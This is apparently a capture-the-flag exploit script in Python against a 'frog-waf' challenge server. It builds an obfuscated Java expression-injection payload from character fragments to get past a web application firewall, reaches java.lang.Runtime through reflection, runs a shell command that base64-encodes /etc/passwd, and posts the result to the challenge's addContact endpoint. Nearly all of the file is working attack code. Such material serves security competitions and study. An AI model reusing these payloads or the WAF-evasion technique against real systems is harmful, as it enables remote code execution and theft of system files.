str_to_use = "message.getClass().getModule().getLayer().toString()"
res = "java.base, java.logging, jdk.crypto.ec, java.instrument, jdk.management, jdk.jdi, jdk.security.jgss, jdk.naming.rmi, jdk.jdwp.agent, jdk.zipfs, jdk.sctp, jdk.naming.ldap, jdk.jartool, java.security.jgss, jdk.net, jdk.jconsole, jdk.scripting.nashorn, jdk.management.agent, jdk.jstatd, java.management, jdk.jsobject, java.management.rmi, jdk.internal.le, java.datatransfer, java.desktop, jdk.accessibility, java.rmi, java.naming, jdk.jshell, jdk.internal.jvmstat, jdk.unsupported.desktop, jdk.xml.dom, java.prefs, jdk.management.jfr, jdk.charsets, jdk.editpad, java.net.http, java.smartcardio, jdk.naming.dns, java.transaction.xa, java.compiler, java.sql.rowset, java.scripting, java.security.sasl, java.xml.crypto, jdk.dynalink, jdk.unsupported, jdk.jlink, java.sql, jdk.compiler, jdk.security.auth, jdk.jdeps, jdk.localedata, jdk.httpserver, jdk.crypto.cryptoki, jdk.jfr, jdk.javadoc, jdk.internal.ed, jdk.attach, jdk.internal.opt, java.xml"
# res = "jdk.internal.jvmstat, java.scripting, jdk.internal.le, java.compiler, jdk.attach, java.datatransfer, jdk.localedata, jdk.zipfs, java.transaction.xa, jdk.javadoc, jdk.security.auth, jdk.jstatd, jdk.internal.ed, java.naming, java.instrument, jdk.editpad, jdk.management.jfr, jdk.jdwp.agent, java.sql, java.net.http, jdk.unsupported.desktop, jdk.management, java.security.sasl, jdk.dynalink, jdk.jsobject, java.base, jdk.naming.rmi, java.logging, jdk.naming.dns, java.management.rmi, jdk.compiler, jdk.jartool, java.xml.crypto, java.security.jgss, jdk.charsets, java.management, jdk.sctp, jdk.jdi, jdk.crypto.cryptoki, jdk.xml.dom, jdk.jlink, java.rmi, jdk.accessibility, jdk.security.jgss, java.prefs, jdk.naming.ldap, jdk.unsupported, jdk.internal.opt, jdk.jconsole, jdk.jfr, java.sql.rowset, jdk.net, jdk.management.agent, jdk.scripting.nashorn, java.desktop, jdk.httpserver, jdk.crypto.ec, java.xml, java.smartcardio, jdk.jshell, jdk.jdeps"

def find_char(char, arr, need_lower = False, need_upper = False):
    global str_to_use

    first_index = res.index(char)
    tmp_str_chunk = str_to_use
    for i in range(first_index):
        tmp_str_chunk += ".substring(message.lines().count())"
    tmp_str_chunk += ".substring(message.compareTo(message),message.lines().count())"
    if need_lower:
        tmp_str_chunk += ".toLowerCase()"
    elif need_upper:
        tmp_str_chunk += ".toUpperCase()"
    arr.append(tmp_str_chunk)

def generate_payload(want_to_construct):
    arr = []
    for char in want_to_construct:
        try:
            find_char(char, arr)
        except ValueError:
            if char.isupper():
                char = char.lower()
                find_char(char, arr, False, True)
            else:
                char = char.upper()
                find_char(char, arr, False, True)

    result = ""
    parentheses = 0
    for chunk in arr:
        result += chunk + ".concat("
        parentheses += 1
    for i in range(parentheses):
        if i == 0:
            result += "message.repeat(message.compareTo(message)))"
            continue
        result += ")"
    return result


def generate_char(char_to_generate):
    ascii_num = ord(char_to_generate)
    payload = "%s.getDeclaredMethods()[%s]"
    payload = payload % (load_class("java.lang.Character"), generate_padding(5))
    payload += ".invoke(%s, %s)"
    payload = payload % (load_class("java.lang.Character"), generate_padding(ascii_num))
    return payload

def generate_padding(len_to_pad):
    the_padding_str = generate_payload("a"*len_to_pad)
    the_padding_str = "(" + the_padding_str + ").length()"
    return the_padding_str

def generate_command(command):
    payload = ""
    arr = []
    for part in command.split(" "):
        try:
            tmp = generate_payload(part)
            arr.append(tmp)
        except ValueError:
            for tmp_tmp in list(part):
                arr.append(generate_char(tmp_tmp))
        arr.append(generate_char(" "))
    parentheses = 0
    for chunk in arr:
        payload += chunk + ".concat("
        parentheses += 1
    for i in range(parentheses):
        if i == 0:
            payload += "message.repeat(message.compareTo(message)))"
            continue
        payload += ")"
    return payload 


def load_class(class_name):
    return "message.getClass().getModule().getLayer().findLoader(%s).loadClass(%s)" % (generate_payload("jdk.jdi"), generate_payload(class_name))


import requests, json

wrapper = load_class("java.io.BufferedReader") 
wrapper += ".getDeclaredConstructors()[message.lines().count()]"
reader = load_class("java.io.InputStreamReader")
reader += ".getDeclaredConstructors()[%s]" % (generate_padding(3))
payload = load_class("java.lang.Runtime")
payload += ".getDeclaredMethods()[%s]"
payload = payload % (generate_padding(7))
payload += ".invoke(%s)"
payload = payload % (load_class("java.lang.Runtime"))
# print(payload)

payload += ".exec(%s).getInputStream()" % (generate_command("sh -c $@|sh . echo cat /etc/passwd | base64 -w0"))

payload = (reader + ".newInstance(%s)") % (payload) 
payload = (wrapper + ".newInstance(%s).readLine()") % (payload)
# print(payload)

url = "http://frog-waf.chals.sekai.team/addContact"
post_data = open("a.txt", "r").read() % (payload)
post_data = json.loads(post_data)
# print(post_data)

req = requests.post(url, json=post_data)
print(req.text)
